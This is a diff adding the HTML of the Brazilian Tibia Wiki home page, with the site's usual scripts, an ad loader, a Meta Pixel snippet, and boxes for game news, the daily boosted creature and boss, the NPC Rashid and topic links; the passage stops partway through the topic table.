@@ -1,0 +1,971 @@
+<!DOCTYPE html>
+<html class="client-nojs" lang="pt-BR" dir="ltr">
+<head>
+<meta charset="UTF-8"/>
+<title>Tibia Wiki - A Enciclopédia do Tibia</title>
+<script>document.documentElement.className="client-js";RLCONF={"wgBreakFrames":false,"wgSeparatorTransformTable":[",\t."," \t,"],"wgDigitTransformTable":["",""],"wgDefaultDateFormat":"dmy","wgMonthNames":["","janeiro","fevereiro","março","abril","maio","junho","julho","agosto","setembro","outubro","novembro","dezembro"],"wgRequestId":"04dea5ff54f5b69d13d8fc72","wgCSPNonce":false,"wgCanonicalNamespace":"","wgCanonicalSpecialPageName":false,"wgNamespaceNumber":0,"wgPageName":"Home","wgTitle":"Home","wgCurRevisionId":435094,"wgRevisionId":435094,"wgArticleId":78,"wgIsArticle":true,"wgIsRedirect":false,"wgAction":"view","wgUserName":null,"wgUserGroups":["*"],"wgCategories":[],"wgPageContentLanguage":"pt-br","wgPageContentModel":"wikitext","wgRelevantPageName":"Home","wgRelevantArticleId":78,"wgIsProbablyEditable":false,"wgRelevantPageIsProbablyEditable":false,"wgRestrictionEdit":["sysop"],"wgRestrictionMove":["sysop"],"wgIsMainPage":true,"wgFlaggedRevsParams":{"tags":{"accuracy":{"levels":3}}},
+"wgStableRevisionId":435094,"wgVector2022PreviewPages":[]};RLSTATE={"site.styles":"ready","user.styles":"ready","user":"ready","user.options":"loading","ext.flaggedRevs.icons":"ready","oojs-ui-core.styles":"ready","oojs-ui.styles.indicators":"ready","mediawiki.widgets.styles":"ready","oojs-ui-core.icons":"ready","skins.vector.styles.legacy":"ready","ext.socialprofile.responsive":"ready","ext.flaggedRevs.basic":"ready"};RLPAGEMODULES=["site","mediawiki.page.ready","skins.vector.legacy.js","ext.FancyBoxThumbs","ext.flaggedRevs.advanced"];</script>
+<script>(RLQ=window.RLQ||[]).push(function(){mw.loader.implement("user.options@12s5i",function($,jQuery,require,module){mw.user.tokens.set({"patrolToken":"+\\","watchToken":"+\\","csrfToken":"+\\"});});});</script>
+<link rel="stylesheet" href="/load.php?lang=pt-br&amp;modules=ext.flaggedRevs.basic%2Cicons%7Cext.socialprofile.responsive%7Cmediawiki.widgets.styles%7Coojs-ui-core.icons%2Cstyles%7Coojs-ui.styles.indicators%7Cskins.vector.styles.legacy&amp;only=styles&amp;skin=vector"/>
+<script async="" src="/load.php?lang=pt-br&amp;modules=startup&amp;only=scripts&amp;raw=1&amp;skin=vector"></script>
+<meta name="ResourceLoaderDynamicStyles" content=""/>
+<link rel="stylesheet" href="/load.php?lang=pt-br&amp;modules=site.styles&amp;only=styles&amp;skin=vector"/>
+<meta name="generator" content="MediaWiki 1.39.3"/>
+<meta name="format-detection" content="telephone=no"/>
+<meta name="description" content="A Enciclopédia Tibiana Brasileira"/>
+<meta name="keywords" content="tibia wiki, tibiawiki, tibia, tibia mmorpg, tibiawikibr, tibia wikibr"/>
+<meta name="viewport" content="width=1000"/>
+<link rel="icon" href="/favicon.ico"/>
+<link rel="search" type="application/opensearchdescription+xml" href="/opensearch_desc.php" title="Tibia Wiki - A Enciclopédia do Tibia (pt-br)"/>
+<link rel="EditURI" type="application/rsd+xml" href="https://www.tibiawiki.com.br/api.php?action=rsd"/>
+<link rel="alternate" type="application/atom+xml" title="Feed Atom da Tibia Wiki - A Enciclopédia do Tibia" href="/index.php?title=Especial:Mudan%C3%A7as_recentes&amp;feed=atom"/>
+<meta property='og:image' content='/images/c/c9/Logo.png'>
+<script async src="//banners.tibiabr.com/www/admin/plugins/ReviveNbannerrotation/nbanner_asyncjs.php"></script>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '620171656279268');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=620171656279268&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+</head>
+<body class="mediawiki ltr sitedir-ltr mw-hide-empty-elt ns-0 ns-subject page-Home rootpage-Home skin-vector action-view skin-vector-legacy vector-feature-language-in-header-enabled vector-feature-language-in-main-page-header-disabled vector-feature-language-alert-in-sidebar-disabled vector-feature-sticky-header-disabled vector-feature-sticky-header-edit-disabled vector-feature-table-of-contents-disabled vector-feature-visual-enhancement-next-disabled"><div id="mw-page-base" class="noprint"></div>
+<div id="mw-head-base" class="noprint"></div>
+<div id="content" class="mw-body" role="main">
+	<a id="top"></a>
+	<!-- Banner topo 970x250 -->
+	<!--<ins data-revive-zoneid="4" data-revive-target="_blank" data-revive-refresh="60" data-revive-id="e083ad21182d1a8ef04ffb1a732e37f8"></ins> 
+	<ins data-revive-zoneid="4" data-revive-target="_blank" data-revive-id="e083ad21182d1a8ef04ffb1a732e37f8"></ins>-->
+	<div id="mw-fr-revisiontag" style="background-color: #fcfcfc; border: 1px solid #A7D7F9; padding: 20px 0px; margin-bottom: 10px;">
+	<center>
+	<div data-premium="" data-adunit="TIBIA_WIKI_TOPO" data-sizes-desktop="[[970,250]]" data-sizes-mobile="[[336,280]]"></div>
+	</center>
+	</div>	
+	<div id="siteNotice"><div id="localNotice"><div class="sitenotice" lang="pt-BR" dir="ltr"><table style="width:100%; vertical-align:top; border-spacing:10px; margin: 0px auto; margin-top:+.8em; text-align:center; background-color:#FFFFFF;">
+   <tbody><tr class="mw-empty-elt">
+
+
+
+
+   </tr>
+   <tr class="mw-empty-elt">
+</tr></tbody></table>
+<table style="width:100%; vertical-align:top; border-spacing:10px; margin: 0px auto; margin-top:+.8em; text-align:center; background-color:#FFFFFF;">
+<tbody><tr><td style="width:25%; min-height:90px; box-shadow:0 0 0.3em #BBB; padding:5px 10px; border-radius:10px; background-color:#FCFCFC;">
+         <table style="width:100%;">
+            <tbody><tr>
+               <td style="width:20%; height:64px; text-align:center; vertical-align:middle;"><img alt="Fansite-Appreciation.png" src="/images/thumb/f/ff/Fansite-Appreciation.png/70px-Fansite-Appreciation.png" decoding="async" width="70" height="64" srcset="/images/thumb/f/ff/Fansite-Appreciation.png/105px-Fansite-Appreciation.png 1.5x, /images/thumb/f/ff/Fansite-Appreciation.png/140px-Fansite-Appreciation.png 2x" /></td>
+               <td style="width:80%; height:64px; text-align:left; vertical-align:middle; padding-left:4px;"><b><span style="font-size:16px;">Fansite Appreciation Day 2026!</span></b></td>
+            </tr>
+            <tr>
+               <td style="width:100%; height:1px; border-bottom:1px solid #BBBBBB" colspan="2"></td>
+            </tr>
+            <tr>
+               <td colspan="2" style="width:100%; height:48px; vertical-align:top; text-align:left;"><span style="font-size:12px;">Confira os vencedores da loteria de itens de fansite!</span></td>
+            </tr>
+            <tr>
+               <td colspan="2" style="width:100%; height:12px; vertical-align:top; text-align:left;"><span class="plainlinks" style="font-size:12px;"><b><a href="/wiki/Fansite_Appreciation_Day_2026" title="Fansite Appreciation Day 2026">Saiba mais &#x2794;</a></b></span></td>
+            </tr>
+         </tbody></table>
+      </td>
+<td style="width:25%; height:90px; box-shadow:0 0 0.3em #BBB; padding:5px 10px; border-radius:10px; background-color:#FCFCFC;">
+         <table style="width:100%;">
+            <tbody><tr>
+               <td style="width:20%; height:64px; text-align:center; vertical-align:middle;"><img alt="Balance Vocation.png" src="/images/thumb/4/42/Balance_Vocation.png/50px-Balance_Vocation.png" decoding="async" width="50" height="50" srcset="/images/thumb/4/42/Balance_Vocation.png/75px-Balance_Vocation.png 1.5x, /images/thumb/4/42/Balance_Vocation.png/100px-Balance_Vocation.png 2x" /></td>
+               <td style="width:80%; height:64px; text-align:left; vertical-align:middle; padding-left:4px;"><b><span style="font-size:16px;">Update do Balanceamento</span></b></td>
+            </tr>
+            <tr>
+               <td style="width:100%; height:1px; border-bottom:1px solid #BBBBBB" colspan="2"></td>
+            </tr>
+            <tr>
+               <td colspan="2" style="width:100%; height:48px; text-align:left; vertical-align:top;"><span style="font-size:12px;">Acompanhe o Balanceamento de Vocações, página em construção com novidades sendo adicionadas em tempo real!</span></td>
+            </tr>
+            <tr>
+               <td colspan="2" style="width:100%; height:12px; vertical-align:top; text-align:left;"><span class="plainlinks" style="font-size:12px;"><b><a href="/wiki/Update_do_Balanceamento_de_Voca%C3%A7%C3%B5es" class="mw-redirect" title="Update do Balanceamento de Vocações">Saiba mais &#x2794;</a></b></span></td>
+            </tr>
+         </tbody></table>
+      </td>
+
+
+<td style="width:25%; height:100px; box-shadow:0 0 0.3em #BBB; padding:5px 10px; border-radius:10px; background-color:#FCFCFC;">
+         <table style="width:100%; vertical-align:top;">
+            <tbody><tr>
+               <td style="width:20%; height:64px; text-align:center; vertical-align:middle;"><img alt="Reliable Ram.gif" src="/images/thumb/9/90/Reliable_Ram.gif/50px-Reliable_Ram.gif" decoding="async" width="50" height="50" srcset="/images/9/90/Reliable_Ram.gif 1.5x" /></td>
+               <td style="width:80%; height:64px; text-align:left; vertical-align:middle; padding-left:4px;"> <b><span style="font-size:16px;">Update de Targuna</span></b></td>
+            </tr>
+            <tr>
+               <td style="width:100%; height:1px; border-bottom:1px solid #BBBBBB" colspan="2"></td>
+            </tr>
+            <tr>
+               <td colspan="2" style="width:100%; height:48px; text-align:left; vertical-align:top;"><span style="font-size:12px;">            Acompanhe tudo sobre o Update de Targuna!<br />
+<br /></span></td>
+            </tr>
+            <tr>
+              <td colspan="2" style="width:100%; height:12px; vertical-align:top; text-align:left;"><span class="plainlinks" style="font-size:12px;"><b><a href="/wiki/Update_de_Targuna" class="mw-redirect" title="Update de Targuna">Saiba mais &#x2794;</a></b></span></td>
+            </tr>
+         </tbody></table>
+      </td>
+   </tr>
+</tbody></table></div></div></div>
+	<div class="mw-indicators">
+	</div>
+	
+	<!-- Banner topo 728x90 -->
+	<center>
+	<div data-premium="" data-adunit="TIBIA_WIKI_TOPO_MEIO" data-sizes-desktop="[[728,90]]" data-sizes-mobile="[[320,50]]"></div>
+	</center>	
+	
+	<h1 id="firstHeading" class="firstHeading mw-first-heading"><span class="mw-page-title-main">Home</span></h1>
+	<div id="bodyContent" class="vector-body">
+		<div id="siteSub" class="noprint">De Tibia Wiki - A Enciclopédia do Tibia</div>
+		<div id="contentSub"><div id="mw-fr-revisiontag" class="flaggedrevs_basic flaggedrevs_draft_synced plainlinks noprint"><span title='Esta é uma versão verificada desta página' class='flaggedrevs-icon oo-ui-widget oo-ui-widget-enabled oo-ui-iconElement-icon oo-ui-icon-eye oo-ui-iconElement oo-ui-labelElement-invisible oo-ui-iconWidget'></span>Esta é a <a href="/wiki/Ajuda:Valida%C3%A7%C3%A3o_de_p%C3%A1ginas" title="Ajuda:Validação de páginas">versão publicada</a>, aprovada em <i>7 de maio de 2026</i>.</div>
+</div>
+		<div id="contentSub2"></div>
+		
+		<div id="jump-to-nav"></div>
+		<a class="mw-jump-link" href="#mw-head">Ir para navegação</a>
+		<a class="mw-jump-link" href="#searchInput">Ir para pesquisar</a>
+		<div id="mw-content-text" class="mw-body-content mw-content-ltr" lang="pt-BR" dir="ltr"><script language="JavaScript">
+
+function getStyleObject(objectId) {
+    // checkW3C DOM, then MSIE 4, then NN 4.
+    //
+    if(document.getElementById) {
+      if (document.getElementById(objectId)) {
+	     return document.getElementById(objectId).style;
+      }
+    } else if (document.all) {
+      if (document.all(objectId)) {
+	     return document.all(objectId).style;
+      }
+    } else if (document.layers) { 
+      if (document.layers[objectId]) { 
+	     return document.layers[objectId];
+      }
+    } else {
+	   return false;
+    }
+}
+
+function toggleObjectVisibility(objectId) {
+    // first get the object's stylesheet
+    var styleObject = getStyleObject(objectId);
+
+    // then if we find a stylesheet, set its visibility
+    // as requested
+    //
+    if (styleObject) {
+        if (styleObject.display == 'none') {
+            styleObject.display = 'block';
+        } else {
+            styleObject.display = 'none';
+        }
+        return true;
+    } else {
+        return false;
+    }
+}
+</script>
+<style type="text/css"><!--
+div.spoiler {border: dashed #82C8DF 1px; border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; background-color: #E5F8FD; padding: 3px; width: 50%;}
+span.spoilerHeader {font-size: 135%; color: #f00;}
+a.spoilerLink {background-color: #E5F8FD; color: #000; font-weight: bold; padding: 4px 4px 2px 4px; border-color: #82C8DF; border-width: 1px; border-style: solid; border-top-right-radius: 3px; border-top-left-radius: 3px; border-bottom-left-radius: 3px; border-bottom-right-radius: 3px;}
+--></style>
+<div class="mw-parser-output"><table style="width:100%" cellpadding="0" cellspacing="8" border="0">
+   <tbody><tr>
+      <td colspan="2" style="padding:2px 0px;">
+         <hr /> INÍCIO RASHID ---------------------------------------------------------------&gt;
+               <table style="width:100%" cellpadding="0" cellspacing="0" border="0">
+            <tbody><tr>
+               <td colspan="10" style="width:100%; padding:0px; vertical-align:top;">
+                  <div style="width:100%; margin:0px 0px 9px 0px; box-shadow:0 0 .5em #999; border-radius:10px;">
+                     <div class="home-box-title">
+                        <table style="width:100%;">
+                           <tbody><tr>
+                              <td style="width:100%; text-align:center; font-size:110%; font-weight:Bold;"><span id="serversave"></span></td>
+                           </tr>
+                        </tbody></table>
+                     </div>
+                     <div style="width:100%; padding:5px 0px;">
+                        <table style="width:100%;">
+                           <tbody><tr>
+                              <td style="width:20%; height:95px; text-align:center; vertical-align:middle; padding:4px 0px 4px 0px; border-radius:0px 12px 0px 0px;"><a href="http://www.tibia.com/community/?subtopic=fansites" target="_blank" rel="nofollow noreferrer noopener"><img alt="Promoted fansite.gif" src="/images/3/38/Promoted_fansite.gif" decoding="async" width="100" height="100" /></a></td>
+                              <td style="width:60%; height:95px; text-align:center; vertical-align:middle; padding:4px 0px 4px 5px; border-radius:0px 0px 0px 0px; border-left:1px solid #CCC; border-right:1px solid #CCC;">
+                                 <p style="margin:0px; font-size:155%; border:none; font-weight:bold; color:#000000;">Bem-vindo ao Tibia Wiki BR</p><p style="margin:0px; font-size:115%; border:none; font-weight:normal; color:#000000;">A Enciclopédia Tibiana Brasileira</p><p style="margin:0px; font-size:95%; border:none; font-weight:normal; color:#000000;"><a href="/wiki/Especial:Estat%C3%ADsticas" title="Especial:Estatísticas">17&#160;766</a> artigos desde maio de 2007</p><p><small><b><a href="/wiki/Ajuda:Editar" title="Ajuda:Editar">Como posso ajudar?</a></b> - <b><a href="/wiki/Tibia_Wiki:Equipe" title="Tibia Wiki:Equipe">Nossa Equipe</a></b> - <b><a href="/wiki/Tibia_Wiki:Contato" title="Tibia Wiki:Contato">Reportar Problemas</a></b></small></p>
+                              </td><td style="width:20%; height:95px; text-align:center; vertical-align:middle; padding:0px 0px 5px 0px; border-radius:10px 0px 0px 0px;">
+                                 <table style="width:100%"><tbody><tr>
+<td colspan="2"><b>Redes Sociais</b></td></tr><tr>
+<td style="text-align:right;"><a href="https://www.instagram.com/tibiawiki" target="_blank" rel="nofollow noreferrer noopener"><img alt="Instagram.png" src="/images/thumb/b/b7/Instagram.png/32px-Instagram.png" decoding="async" width="32" height="32" srcset="/images/thumb/b/b7/Instagram.png/48px-Instagram.png 1.5x, /images/b/b7/Instagram.png 2x" /></a></td>
+<td style="text-align:left;"><a href="https://discord.gg/uVqKzHZsVr" target="_blank" rel="nofollow noreferrer noopener"><img alt="Discord.png" src="/images/thumb/d/dd/Discord.png/32px-Discord.png" decoding="async" width="32" height="32" srcset="/images/thumb/d/dd/Discord.png/48px-Discord.png 1.5x, /images/d/dd/Discord.png 2x" /></a></td>
+</tr><tr>
+<td style="text-align:right;"><a href="https://www.youtube.com/TibiaWikiBR_Oficial" target="_blank" rel="nofollow noreferrer noopener"><img alt="YouTube.png" src="/images/thumb/c/c0/YouTube.png/32px-YouTube.png" decoding="async" width="32" height="32" srcset="/images/thumb/c/c0/YouTube.png/48px-YouTube.png 1.5x, /images/c/c0/YouTube.png 2x" /></a></td>
+<td style="text-align:left;"><a href="https://www.facebook.com/tibiawikibr/" target="_blank" rel="nofollow noreferrer noopener"><img alt="Facebook.png" src="/images/thumb/5/55/Facebook.png/32px-Facebook.png" decoding="async" width="32" height="32" srcset="/images/thumb/5/55/Facebook.png/48px-Facebook.png 1.5x, /images/5/55/Facebook.png 2x" /></a></td>
+                                 </tr></tbody></table>
+                              </td>
+                           </tr>
+                        </tbody></table>
+                     </div>
+                  </div>
+               </td>
+            </tr>
+            <tr>
+               <td style="width:32.60%; padding:0px;">
+                  <div style="width:100%; box-shadow:0 0 .5em #999; border-radius:10px;">
+                     <div class="home-box-title" style="height:10px;">
+                        <table style="width:100%;">
+                           <tbody><tr>
+                              <td style="width:100%; padding-left:1px; text-align:left;">
+                                 <div class="tooltip" id="show" style="font-size:100%; font-weight:Bold; color:#FFFFFF; text-decoration:none;">Criatura do Dia <img alt="Info icon.png" src="/images/thumb/5/58/Info_icon.png/14px-Info_icon.png" decoding="async" width="14" height="14" srcset="/images/thumb/5/58/Info_icon.png/21px-Info_icon.png 1.5x, /images/thumb/5/58/Info_icon.png/28px-Info_icon.png 2x" /></div>
+                                 <div style="width:250px; padding:0px 15px 10px 15px; text-align:left; font-size:100%; color:#000000" class="tip2" id="tip-espaco">
+                                    <h4><span class="mw-headline" id="Criatura_do_Dia"><b>Criatura do Dia</b></span></h4>
+                                    <p>A cada server save, uma criatura é sorteada, durante esse tempo a criatura selecionada irá:</p>
+                                    <ul>
+                                       <li>Render mais pontos de experiência.</li>
+                                       <li>Carregar mais itens do que o normal.</li>
+                                       <li>Seu respawn terá uma taxa mais rápida (a taxa de respawn é duas vezes mais rápida do que o normal).</li>
+                                    </ul>
+                                 </div>
+                              </td>
+                           </tr>
+                        </tbody></table>
+                     </div>
+                     <div class="home-box-bg-img" id="boostedcreature_home">
+                        <div class="home-box-pedestal">
+                           <div id="boostedcreature_home_img" style="margin:-3px 0px 0px -23px;"></div>
+                        </div>
+                     </div>
+                     <div class="home-box-info">
+                        <div id="boostedcreature_home_txt" style="text-align:center; font-size:85%; padding-top:6px; font-weight:400;"></div>
+                     </div>
+                     <div class="load_js" data-script="FeaturedCreatures.js"></div>
+                  </div>
+               </td>
+               <td style="width:1%;"></td>
+               <td style="width:32.60%; padding:0px;">
+                  <div style="width:100%; box-shadow:0 0 .5em #999; border-radius:10px;">
+                     <div class="home-box-title" style="height:10px;">
+                        <table style="width:100%;">
+                           <tbody><tr>
+                              <td style="width:100%; padding-left:1px; text-align:left;">
+                                 <div class="tooltip" id="show" style="font-size:100%; font-weight:Bold; color:#FFFFFF; text-decoration:none;">Boss do Dia <img alt="Info icon.png" src="/images/thumb/5/58/Info_icon.png/14px-Info_icon.png" decoding="async" width="14" height="14" srcset="/images/thumb/5/58/Info_icon.png/21px-Info_icon.png 1.5x, /images/thumb/5/58/Info_icon.png/28px-Info_icon.png 2x" /></div>
+                                 <div style="width:250px; padding:0px 15px 10px 15px; text-align:left; font-size:100%; color:#000000" class="tip2" id="tip-espaco">
+                                    <h4><span class="mw-headline" id="Boss_do_Dia"><b>Boss do Dia</b></span></h4>
+                                    <p>A cada server save, um Boss Archfoe é sorteado, durante esse tempo o boss selecionado irá:</p>
+                                    <ul>
+                                       <li>Aumentar a chance de drop dos itens equipáveis em 250%.</li>
+                                       <li>Fazer com que uma morte conte como x3 no Bosstiary.</li>
+                                    </ul>
+                                 </div>
+                              </td>
+                           </tr>
+                        </tbody></table>
+                     </div>
+                     <div class="home-box-bg-img" id="boostedboss_home">
+                        <div class="home-box-pedestal">
+                           <div id="boostedboss_home_img" style="margin:-3px 0px 0px -23px;"></div>
+                        </div>
+                     </div>
+                     <div class="home-box-info">
+                        <div id="boostedboss_home_txt" style="text-align:center; font-size:85%; padding-top:6px; font-weight:400;"></div>
+                     </div>
+                  </div>
+               </td>
+               <td style="width:1%;"></td>
+<td style="width:32.60%; padding:0px; vertical-align:top;">
+                  <div style="width:100%; box-shadow:0 0 .5em #999; border-radius:10px;">
+                     <div class="home-box-title" style="height:10px;">
+                        <table style="width:100%;">
+                           <tbody><tr>
+                              <td style="width:100%; padding-left:1px; text-align:left;">
+                                 <div class="tooltip" id="show" style="font-size:100%; font-weight:Bold; color:#FFFFFF; text-decoration:none;">Rashid <img alt="Info icon.png" src="/images/thumb/5/58/Info_icon.png/14px-Info_icon.png" decoding="async" width="14" height="14" srcset="/images/thumb/5/58/Info_icon.png/21px-Info_icon.png 1.5x, /images/thumb/5/58/Info_icon.png/28px-Info_icon.png 2x" /></div>
+                                 <div style="width:250px; padding:0px 15px 10px 15px; text-align:left; font-size:100%; color:#000000" class="tip2" id="tip-espaco">
+                                    <h4><span class="mw-headline" id="Rashid"><b>Rashid</b></span></h4>
+                                    <p>Rashid é um NPC comerciante que compra vários itens valiosos, ele está sempre alternando entre sete cidades (01 por dia). Para conseguir negociar com ele, você deve completar a <b>The Travelling Trader Quest</b>.</p>
+                                 </div>
+                              </td>
+                           </tr>
+                        </tbody></table>
+                     </div>
+                     <div class="home-box-bg-img" id="rashid_home">
+                        <div class="home-box-pedestal">
+                           <div style="margin:-3px 0px 0px -23px;"><a href="/wiki/Rashid" title="Rashid"><img alt="Rashid.gif" src="/images/f/f5/Rashid.gif" decoding="async" width="64" height="64" /></a></div>
+                        </div>
+                     </div>
+                     <div class="home-box-info">
+                        <div style="text-align:center; font-size:85%; padding-top:6px; font-weight:400;">
+<span id="rashid_city_white"></span></div>
+                     </div>
+                  </div>
+               </td>
+            </tr>
+         </tbody></table>
+      </td>
+      <td rowspan="3" style="width:31%; vertical-align:top;">
+         <table style="width:100%;">
+            <tbody><tr class="mw-empty-elt">
+                       
+            </tr>
+            <tr>
+               <td style="width:100%; padding:0px; vertical-align:top;">
+                  <div style="width:100%; margin:0px 0px 8px 0px; box-shadow:0 0 .5em #999; border-radius:10px;">
+                     <div class="home-box-title">
+                        <table style="width:100%;">
+                           <tbody><tr>
+                              <td style="width:10%"><img alt="Incomprehensible Riches.gif" src="/images/thumb/d/d9/Incomprehensible_Riches.gif/32px-Incomprehensible_Riches.gif" decoding="async" width="32" height="33" srcset="/images/d/d9/Incomprehensible_Riches.gif 1.5x" /></td>
+                              <td style="width:90%; padding-left:8px; text-align:left; font-size:105%; font-weight:Bold;">Publicidade</td>
+                           </tr>
+                        </tbody></table>
+                     </div>
+                     <div style="background-color:white; text-align:center; padding:0.5em 0.5em 0.5em 0.5em; border-radius:10px 10px 10px 10px;">
+                        <div style="display:block; margin:0px auto; height:298px; max-width:300px; overflow:hidden; width:99%; overflow-x:auto; overflow-y:auto;">
+                        <center><div data-premium="" data-adunit="TIBIA_WIKI_LATERAL_DIREITA" data-sizes-desktop="&#91;&#91;300,250&#93;&#93;" data-sizes-mobile="&#91;&#91;300,250&#93;&#93;"></div></center>
+                        </div>
+                     </div>
+                  </div>
+               </td>
+            </tr>
+            <tr>
+               <td style="width:100%; padding:0px; vertical-align:top;">
+                  <div style="width:100%; margin:0px 0px 8px 0px; box-shadow:0 0 .5em #999; border-radius:10px;">
+                     <div class="home-box-title">
+                        <table style="width:100%;">
+                           <tbody><tr>
+                              <td style="width:10%"><img alt="Drome Cube.gif" src="/images/b/b3/Drome_Cube.gif" decoding="async" width="32" height="32" /></td>
+                              <td style="width:90%; padding-left:8px; text-align:left; font-size:105%; font-weight:Bold;">Tibiadrome</td>
+                           </tr>
+                        </tbody></table>
+                     </div>
+                     <div style="background-color:white; max-height:598px; overflow:hidden; overflow-y:scroll; text-align:center; padding:0 0 0.5em 0.8em; border-radius:0px 0px 10px 10px;"><div class="load_js" data-script="Tibiadrome.js" id="tibiadrome_cal"></div><b><a href="/wiki/Tibiadrome" title="Tibiadrome">Saiba mais &#x2794;</a></b><br /></div>
+                  </div>
+               </td>
+            </tr>
+            <tr>
+               <td style="width:100%; padding:0px; vertical-align:top;">
+                  <div style="box-shadow:0 0 .5em #999; border-radius:10px;">
+                     <div class="home-box-title">
+                        <table style="width:100%;">
+                           <tbody><tr>
+                              <td style="width:10%"><img alt="Colourful Fireworks Rocket.gif" src="/images/thumb/b/b7/Colourful_Fireworks_Rocket.gif/32px-Colourful_Fireworks_Rocket.gif" decoding="async" width="32" height="32" srcset="/images/b/b7/Colourful_Fireworks_Rocket.gif 1.5x" /></td>
+                              <td style="width:90%; padding-left:8px; text-align:left; font-size:105%; font-weight:Bold;">Eventos</td>
+                           </tr>
+                        </tbody></table>
+                     </div>
+                     <div style="background-color:white; max-height:598px; overflow:hidden; overflow-y:scroll; text-align:left; padding:0 0 0.5em 0.8em; border-radius:0px 0px 10px 10px;"><span style="font-size:120%; border:none; vertical-align:-5px; font-weight:bold; color:#000000;">Demon's Lullaby</span><br /><hr />Quando o fardo da mãe se torna o fardo do herói? Quando uma mãe demônio decide tirar alguns dias de folga. Proteja seus filhos horríveis para evitar sua ira. Mas esteja avisado: bebês demônios podem ser muito quentes para lidar. <b><a href="/wiki/Demon%27s_Lullaby" title="Demon&#39;s Lullaby">Saiba mais &#x2794;</a></b><br /></div>
+                  </div>
+               </td>
+            </tr>
+         </tbody></table>
+      </td>
+   </tr>
+   <tr>
+      <td colspan="2" style="padding:1px; vertical-align:top; width:69%;">
+         <div style="box-shadow:0 0 .5em #999; border-radius:10px;">
+            <div class="home-box-title">
+               <table style="width:100%;">
+                  <tbody><tr>
+                     <td style="width:5%"><img alt="Tibian Book.gif" src="/images/thumb/4/4c/Tibian_Book.gif/30px-Tibian_Book.gif" decoding="async" width="30" height="30" srcset="/images/thumb/4/4c/Tibian_Book.gif/45px-Tibian_Book.gif 1.5x, /images/thumb/4/4c/Tibian_Book.gif/60px-Tibian_Book.gif 2x" /></td>
+                     <td style="width:95%; padding-left:8px; text-align:left; font-size:105%; font-weight:Bold;">Tópicos Importantes</td>
+                  </tr>
+               </tbody></table>
+            </div>
+            <div style="text-align:center; font-weight:bold; font-size:90%; padding: 5px 5px; border-radius:0px 0px 10px 10px;">
+               <table style="height:598px; width:100%; border-spacing:5px;">
+                  <tbody><tr>
+                     <td style="width:20%;"><a href="/wiki/Quests" title="Quests"><img alt="Icone7.png" src="/images/6/63/Icone7.png" decoding="async" width="52" height="51" /></a></td>
+                     <td style="width:20%;"><a href="/wiki/Itens" title="Itens"><img alt="Icone3.png" src="/images/3/37/Icone3.png" decoding="async" width="68" height="52" /></a></td>
+                     <td style="width:20%;"><a href="/wiki/Criaturas" title="Criaturas"><img alt="Icone2.png" src="/images/a/a8/Icone2.png" decoding="async" width="70" height="74" /></a></td>
+                     <td style="width:20%;"><a href="/wiki/Achievements" title="Achievements"><img alt="Icone1.png" src="/images/c/cb/Icone1.png" decoding="async" width="47" height="54" /></a></td>
+                     <td style="width:20%;"><a href="/wiki/Mapa" title="Mapa"><img alt="Icone6.png" src="/images/7/7d/Icone6.png" decoding="async" width="53" height="40" /></a></td>
+                  </tr>
+                  <tr>
+                     <td style="width:20%;"><a href="/wiki/Quests" title="Quests">Quests</a></td>
+                     <td style="width:20%;"><a href="/wiki/Itens" title="Itens">Itens</a></td>
+                     <td style="width:20%;"><a href="/wiki/Criaturas" title="Criaturas">Criaturas</a></td>
+                     <td style="width:20%;"><a href="/wiki/Achievements" title="Achievements">Achievements</a></td>
+                     <td style="width:20%;"><a href="/wiki/Mapa" title="Mapa">Mapa</a></td>
+                  </tr>
+                  <tr>
+                     <td style="width:20%;"><a href="/wiki/Magias" title="Magias"><img alt="Icone4.png" src="/images/9/90/Icone4.png" decoding="async" width="65" height="57" /></a></td>
+                     <td style="width:20%;"><a href="/wiki/Imbuement_Tool" title="Imbuement Tool"><img alt="Imbuing Shrine2.gif" src="/images/1/1c/Imbuing_Shrine2.gif" decoding="async" width="64" height="64" /></a></td>
+                     <td style="width:20%;"><a href="/wiki/Exaltations" title="Exaltations"><img alt="Omnious Device.gif" src="/images/3/38/Omnious_Device.gif" decoding="async" width="64" height="64" /></a></td>                     
+                     <td style="width:20%;"><a href="/wiki/World_Quests" title="World Quests"><img alt="Icone8.png" src="/images/f/ff/Icone8.png" decoding="async" width="63" height="65" /></a></td>
+                     <td style="width:20%;"><a href="/wiki/Tarefas_Di%C3%A1rias" title="Tarefas Diárias"><img alt="Tibian Parchment.gif" src="/images/thumb/2/22/Tibian_Parchment.gif/56px-Tibian_Parchment.gif" decoding="async" width="56" height="56" srcset="/images/2/22/Tibian_Parchment.gif 1.5x" /></a></td>
+                  </tr>
+                  <tr>
+                     <td style="width:20%;"><a href="/wiki/Magias" class="mw-redirect" title="Magias">Magias</a></td>
+                     <td style="width:20%;"><a href="/wiki/Imbuement_Tool" title="Imbuement Tool">Imbuement Tool</a></td>
+                     <td style="width:20%;"><a href="/wiki/Exaltation_Forge" title="Exaltation Forge">Exaltations</a></td>                     
+                     <td style="width:20%;"><a href="/wiki/World_Quests" title="World Quests">World Quests</a></td>
+                     <td style="width:20%;"><a href="/wiki/Tarefas_Di%C3%A1rias" title="Tarefas Diárias">Tasks Diárias</a></td>
+                  </tr>
+                  <tr>
+                     <td style="width:20%;"><a href="/wiki/NPCs" title="NPCs"><img alt="Icone5.png" src="/images/e/e4/Icone5.png" decoding="async" width="65" height="63" /></a></td>
+                     <td style="width:20%;"><a href="/wiki/Familiares" title="Familiares"><img alt="Snowbash.gif" src="/images/9/9b/Snowbash.gif" decoding="async" width="64" height="64" /></a></td>
+                     <td style="width:20%;"><a href="/wiki/Outfits" title="Outfits"><img alt="Icone10.png" src="/images/6/67/Icone10.png" decoding="async" width="71" height="64" /></a></td>
